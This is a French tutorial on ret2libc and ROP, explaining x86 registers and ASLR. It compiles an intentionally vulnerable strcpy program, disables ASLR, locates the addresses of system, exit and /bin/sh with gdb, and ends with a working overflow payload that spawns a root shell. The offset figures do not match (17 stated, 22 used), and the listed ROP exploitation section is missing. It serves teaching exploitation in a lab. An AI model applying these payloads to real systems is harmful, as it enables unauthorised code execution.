- Fonctionnement basique
    - Registre
      - Registre 32-bits
      - Registre 64-bits
    - ASLR
      - Où est stocker le fichier ASLR pour l'activer ou le désactiver ?
    - Explication de l'exploitation de retour à la libc
      - Faille ret2libc
    - Explication de l'exploitation de la technique ROP
      - Faille ROP
- Exploitation
    - Attaque retour à la libc
    - Attaque par ROP

# Fonctionnement basique
## Registre
### Registre 32-bits

Un processeur 32 bits de type Intel dispose de 16 registres qui sont classables en trois catégories :

- les 8 registres généralistes utilisés pour contenir des données et des pointeurs ;
- les registres de segments utilisés pour contenir l’adresses des différents segments (données, code, etc.) ;
- les registres de contrôle et de statut qui donnent des informations sur l’exécution du programme en cours.

![test](http://flint.cs.yale.edu/cs421/papers/x86-asm/x86-registers.png)

- EAX : registre accumulateur (accumulator register).
Utilisé pour les opérations arithmétiques et le stockage de la valeur de retour des appels systèmes.

- EBX : registre de base (base register). 
Utilisé comme pointeur de donnée (située dans DS en mode segmenté, segment par défaut) ou sert de base au calcul d'une adresse.

- ECX : registre compteur (counter register). 
Utilisé comme compteur par certaines intructions, permettant de répéter une série d'instructions un nombre de fois prédéterminé.

- EDX : registre de données (data register). 
Utilisé pour les opérations arithmétiques et les opérations d'entrée/sortie.

Ce sont des registres 32 bits, pour des raisons historiques, les 16 bits de poids faible sont constitués respectivement des registres AX, DX, CX et BX. 
Ces 4 registres 16 bits sont également décomposés en 8 registres de 8 bits pour stocker des valeurs beaucoup plus petite.

Les registres d'offset sont utilisés lors de l'adressage indirect de la mémoire (pointeurs). Ces registres complémentaires sont :

- EBP : (Extended Base Pointer) pointeur de base, utilisé dans le calcul d'adresse mémoire.
- ESP : (Extended Stack Pointer) pointeur de pile.
- ESI : (Extended Source Index) pointeur source.
- EDI : (Extended Destination Index) pointeur destination.
- EPI : (Extended Instruction Pointer) Le registre EIP est utilisé avec le segment du registre CS par le processeur pour connaitre la prochaine instruction à exécuter.

### Registre 64-bits

Avec les registres 64-bits, nous pouvons stocker des valeurs beaucoup plus importantes, les noms de registres changent également, par exemple `EAX` devient `RAX`, mais leur fonction sont parfaitement les mêmes.

![test](https://clementbera.files.wordpress.com/2014/01/gpreg.png)

## ASLR

L'ASLR est un système qui permet de randomiser les adresses mémoires dans un système informatique (par exemple pour éviter les attaques par `buffer overflow`.

![test](https://raw.githubusercontent.com/0ldProgrammer/pic/main/Screenshot_2021-02-08_18-00-58.png)

### Où est stocker le fichier ASLR pour l'activer ou le désactiver ?

Basiquement, le fichier `ASLR` est stocker dans le dossier `/proc/sys/kernel/` avec comme nom de fichier `randomize_va_space`. Si j'affiche ce fichier, il s'avère que il me renvoie comme valeur `2` ce qui veut dire que l'ASLR est activer et randomise bien les adresses dans le système.

    root@wildcodeschool:/usr/bin# ldd /usr/bin/ovrflw 
            linux-gate.so.1 (0xf7f04000)
            libc.so.6 => /lib32/libc.so.6 (0xf7d1a000) <---
            /lib/ld-linux.so.2 (0xf7f05000)               |
    root@wildcodeschool:/usr/bin# ldd /usr/bin/ovrflw     |
            linux-gate.so.1 (0xf7f5c000)                  |
            libc.so.6 => /lib32/libc.so.6 (0xf7d72000) <---
            /lib/ld-linux.so.2 (0xf7f5d000)               |
    root@wildcodeschool:/usr/bin# ldd /usr/bin/ovrflw     |
            linux-gate.so.1 (0xf7fc6000)                  |
            libc.so.6 => /lib32/libc.so.6 (0xf7ddc000) <---
            /lib/ld-linux.so.2 (0xf7fc7000)

Maintenant, essayons de changer la valeur du fichier `randomize_va_space` par la valeur `0` et essayons d'exécuter à nouveau la commande `ldd` si les adresses sont toujours randomisées.

    root@wildcodeschool:/usr/bin# echo 0 > /proc/sys/kernel/randomize_va_space
    root@wildcodeschool:/usr/bin# ldd /usr/bin/ovrflw
            linux-gate.so.1 (0xf7f2c000)
            libc.so.6 => /lib32/libc.so.6 (0xf7d42000) <---
            /lib/ld-linux.so.2 (0xf7f2d000)               |
     root@wildcodeschool:/usr/bin# ldd /usr/bin/ovrflw    |
            linux-gate.so.1 (0xf7f2c000)                  |
            libc.so.6 => /lib32/libc.so.6 (0xf7d42000) <---
            /lib/ld-linux.so.2 (0xf7f2d000)               |    
    root@wildcodeschool:/usr/bin# ldd /usr/bin/ovrflw     |
            linux-gate.so.1 (0xf7f2c000)                  |
            libc.so.6 => /lib32/libc.so.6 (0xf7d42000) <---
            /lib/ld-linux.so.2 (0xf7f2d000) 
 
 Les adresses restent les mêmes, après avoir changé la valeur dans le fichier `randomize_va_space`. Mais aujourd'hui, il est possible de contourner cette protection en fesant des attaques par `brute-force` ou via des techniques par `ROP` par exemple.
 
## Explication de l'exploitation de retour à la libc
### Faille ret2libc

Le buffer overflow est une vulnérabilité présente lorsque le programmeur ne vérifie pas la taille d’une variable fournie par l’utilisateur, et qu’il stocke cette variable en mémoire. Il est alors possible pour l’attaquant d’entrer une valeur de taille supérieure à ce qui était prévu, et lorsque cette valeur (appelée buffer) est copiée en mémoire, elle dépasse de l’espace qui lui était alloué (dépassement de tampon).

Donc, basiquement la technique de la retour à la libc s'applique lorsque la pile n'est pas exécutable, le but est d'utiliser les fonctions de la `libc` comme `system()`, `exit()` pour essayer de faire exécuter une commande au programme alors que le programme n'était pas prévu pour cela.

Lorsque l'attaquant aura trouver la taille du buffer, il cherchera les adresses des fonctions de `system()`, de `exit()` et également de l'adresse de `/bin/sh`.

![other_test](https://imgur.com/Fa3DlCN.png)

Par exemple, dans le schéma ci-dessus, si nous dépassons la taille du `buffer`, il y a 4 octets allouées dans le registre `EIP`, et nous mettrons l'adresse de la fonction `system()` pour que le processeur pointe vers l'adresse de `system()` et exécute notre fonction pour modifier le comportement du programme.

## Explication de l'exploitation de la technique ROP
### Faille ROP

Avant de commencer l'exploitation, il faut bien comprendre à quoi sert ce système et de comprendre son fonctionnement.

Le `ROP`, return-oriented programming, est une technique d'exploitation avancée de type dépassement de pile (stack overflow) permettant l'exécution de code par un attaquant et ce en s'affranchissant plus ou moins efficacement des mécanismes de protection tels que l'utilisation de zones mémoires non-exécutables (cf. bit NX pour Data Execution Prevention, DEP), l'utilisation d'un espace d'adressage aléatoire (Address Space Layout Randomization, `ASLR`).

Notre but concrètement c'est de récupérer des instructions du binaire pour ensuite faire un rassemblement d'instruction (les bouts d'instruction on appel ça un `gadget` c'est le langage utilisé quand nous exploitons du ROP). Imagions que nous avons des instructions basique. (C'est un exemple bien evidamment)

    push   ebp                # Instruction 1
    mov    ebp,esp            # Instruction 2
    push   ecx                # Instruction 3
    sub    esp,0x4            # Instruction 4
    call   0x804848b <secret> # Instruction 5 
    mov    eax,0x0            # Instruction 6

Imaginons que par la suite, nous décidons de prendre les instructions qui nous intéresse pour ensuite faire un rassemblement d'instruction, par exemple.

    push   ebp                # Instruction 1
    mov    ebp,esp            # Instruction 2
    mov    eax,0x0            # Instruction 6

Justement, notre but c'est de récupérer les instructions du binaire pour ensuite modifier le comportement du programme et d'exécuter quelques choses qui nous intéresse par exemple un `SHELL`.

# Exploitation
## Attaque par retour à la libc

(Pour cette partie, nous désactiverons l'`ASLR`, car la technique de retourne à la libc fonctionne uniquement si la pile n'est pas exécutable et que l'ASLR n'est pas activé.)

Voici un petit script en C qui ne fait pas grand chose :

    #include <stdlib.h>
    #include <stdio.h>
    #include <string.h>

    void name(char*);

    void name(char *f)
    {
        char firstname[10];
        strcpy(firstname, f);
        printf("Your name : %s\n", firstname);
    }

    int main(int argc, char *argv[])
    {
        if(argc != 2)
        {
            exit(0);
        }
        name(argv[1]);
        return 0;
    }
    
Un programme basique qui ne fait pas grand chose, mais la vulnérabilité se trouve au niveau de la fonction `strcpy();`. Je suppose que vous savez que les fonctions comme `strcpy();`, `strcat();` etc.. ne sont pas du tout sécurisées donc il existe un système qui se nomme `FORTIFY_SOURCE` qui permet de remplacer les fonctions par des fonctions beaucoup plus sécurisées.

Ensuite, une petite compilation est nécessaire :

    root@0xEX75:~/libc# gcc -m32 -fno-stack-protector libc.c -o libc
    root@0xEX75:~/libc# readelf -lW libc|grep GNU_STACK
    GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RW  0x10
    
(Le flag `E` n'est pas là, donc la pile n'est plus du tout exécutable.). Si nous essayons d'exécuter le programme après la compilation, cela fonctionne, mais dans la mémoire il se passe des choses.

    root@0xEX75:~/libc# ./libc $(python -c 'print "A"*17')
    Your name : AAAAAAAAAAAAAAAAA
    root@0xEX75:~/libc# ./libc $(python -c 'print "A"*18')
    Your name : AAAAAAAAAAAAAAAAAA
    segmentation fault (core dumped)
    
Nous pouvons aperçevoir que le programme plante après 17 caractères, donc l'`OFFSET` correspond exactement à 17 caractères, si nous effectuons un dépassement, la sauvegarde `sEIP` sera complètement écrasé et le programme plantera automatiquement.

Nous allons lancer `GDB` (GNU Debugger), et nous allons chercher l'adresse de la fonction `system();`, `exit();` et finalement une chaîne comme `/bin/sh` qui nous permettra de lancer cette commande en particulier.

    root@0xEX75:~/libc# gdb ./libc
    GNU gdb (Debian 8.3.1-1) 8.3.1
    Copyright (C) 2019 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.
    Type "show copying" and "show warranty" for details.
    This GDB was configured as "x86_64-linux-gnu".
    Type "show configuration" for configuration details.
    For bug reporting instructions, please see:
    <http://www.gnu.org/software/gdb/bugs/>.
    Find the GDB manual and other documentation resources online at:
        <http://www.gnu.org/software/gdb/documentation/>.

    For help, type "help".
    Type "apropos word" to search for commands related to "word"...
    Reading symbols from ./libc...
    (No debugging symbols found in ./libc)
    gdb-peda$ r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Starting program: /root/libc/libc AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Your name : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

    Program received signal SIGSEGV, Segmentation fault.
    [----------------------------------registers-----------------------------------]
    EAX: 0x54 ('T')
    EBX: 0x41414141 ('AAAA')
    ECX: 0x7fffffac 
    EDX: 0xf7fae010 --> 0x0 
    ESI: 0xf7fac000 --> 0x1d6d6c 
    EDI: 0xf7fac000 --> 0x1d6d6c 
    EBP: 0x41414141 ('AAAA')
    ESP: 0xffffd290 ('A' <repeats 45 times>)
    EIP: 0x41414141 ('AAAA')
    EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
    Invalid $PC address: 0x41414141
    [------------------------------------stack-------------------------------------]
    0000| 0xffffd290 ('A' <repeats 45 times>)
    0004| 0xffffd294 ('A' <repeats 41 times>)
    0008| 0xffffd298 ('A' <repeats 37 times>)
    0012| 0xffffd29c ('A' <repeats 33 times>)
    0016| 0xffffd2a0 ('A' <repeats 29 times>)
    0020| 0xffffd2a4 ('A' <repeats 25 times>)
    0024| 0xffffd2a8 ('A' <repeats 21 times>)
    0028| 0xffffd2ac ('A' <repeats 17 times>)
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    Stopped reason: SIGSEGV
    0x41414141 in ?? ()
    gdb-peda$ p system
    $1 = {<text variable, no debug info>} 0xf7e17660 <system> # ADDRESS FUNCTION SYSTEM
    gdb-peda$ p exit
    $2 = {<text variable, no debug info>} 0xf7e0a6f0 <exit> # ADDRESS FUNCTION EXIT
    gdb-peda$ searchmem "/bin/sh"
    Searching for '/bin/sh' in: None ranges
    Found 1 results, display max 1 items:
    libc : 0xf7f54f68 ("/bin/sh") # ADDRESS /BIN/SH
    
Donc, nous avons réussis à capturer les adresses de `system();`, `exit()` et finalement de la chaîne "`/bin/sh"`.

- `system();` : `0xf7e17660`
- `exit();`   : `0xf7e0a6f0`
- `/bin/sh`   : `0xf7f54f68`

![forthebadge made-with-python](https://fundacion-sadosky.github.io/guia-escritura-exploits/esoteric/imagenes/ret-2-libc.png)

Il suffit maintenant d'utiliser les adresses que nous avons capturer contre le programme afin de `pop` un shell. Si nous avons pris la fonction `exit()`, c'est pour simplement quitter le shell de manière correct, car si nous mettons pas la fonction `exit();`, et que nous quittons le shell, il nous affichera un beau `segfault`, donc pas très beau à voir, vous n'êtes pas obliger de le mettre n'empêche, c'est totalement facultatif.

    root@0XEX75:~/libc# ./libc $(python -c 'print "A"*22 + "\x60\x76\xe1\xf7" + "\xf0\xa6\xe0\xf7" + "\x68\x4f\xf5\xf7"')
    Your name : AAAAAAAAAAAAAAAAAAAAAA`vhO
    # whoami
    root
    # id
    uid=0(root) gid=0(root) groupes=0(root)
